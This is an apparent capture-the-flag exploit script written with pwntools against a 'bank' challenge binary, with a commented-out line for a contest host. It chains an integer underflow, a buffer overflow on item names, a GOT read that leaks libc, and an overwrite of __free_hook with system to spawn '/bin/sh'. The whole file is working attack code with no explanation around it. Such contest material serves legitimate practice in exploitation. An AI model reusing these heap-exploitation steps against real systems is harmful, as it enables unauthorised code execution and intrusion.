from pwn import *

from time import sleep


def wait_menu():
    p.recvuntil('---> ')


def show_my_info():
    wait_menu()
    p.sendline('1')


def transfer(bank, amount):
    wait_menu()
    p.sendline('2')
    wait_menu()
    p.sendline(str(bank))
    wait_menu()
    p.sendline(str(amount))


def deposit(bank, amount):
    wait_menu()
    p.sendline('3')
    wait_menu()
    p.sendline(str(bank))
    wait_menu()
    p.sendline(str(amount))


def withdraw(bank, amount):
    wait_menu()
    p.sendline('4')
    wait_menu()
    p.sendline(str(bank))
    wait_menu()
    p.sendline(str(amount))


def buy_item(item):
    wait_menu()
    p.sendline('5')
    wait_menu()
    p.sendline(str(item))


def change_item_name(index, name):
    wait_menu()
    p.sendline('6')
    wait_menu()
    p.sendline(str(index))
    wait_menu()
    p.sendline(name)


MALLOC_OFFSET = 0x84130
SYSTEM_OFFSET = 0x45390
FREE_HOOK = 0x3c67a8

p = process('./bank', raw=False)
# p = remote('challenges.whitehatcontest.kr', 9999)

deposit(1, 800)

for i in range(5):
    transfer(1, 0)

withdraw(1, 800)
withdraw(1, 800)
withdraw(1, 1000000000000000000*5)

sleep(3)

buy_item(1)
change_item_name(0, '/bin/sh'.ljust(32, '\x00'))

for i in range(15):
    buy_item(1)
    change_item_name(i+1, 'A'*32)

buy_item(1)
change_item_name(16, p64(0x602fd8))

wait_menu()
p.sendline(str(1))

p.recvuntil('* Account Number : ')
malloc_leak = u64(p.recvline().strip().ljust(8, '\x00'))
log.success('malloc: 0x%x' % malloc_leak)

libc_base = malloc_leak - MALLOC_OFFSET
log.success('libc: 0x%x' % libc_base)

change_item_name(16, p64(0x603180))
wait_menu()
p.sendline('5')
wait_menu()
p.sendline('\xff')
wait_menu()
p.sendline(str(1))
p.sendline(p64(0))

change_item_name(16, p64(libc_base + FREE_HOOK))
wait_menu()
p.sendline('5')
wait_menu()
p.sendline('\xff')
wait_menu()
p.sendline(str(1))
p.sendline(p64(libc_base + SYSTEM_OFFSET))

wait_menu()
p.sendline('7')

p.interactive()
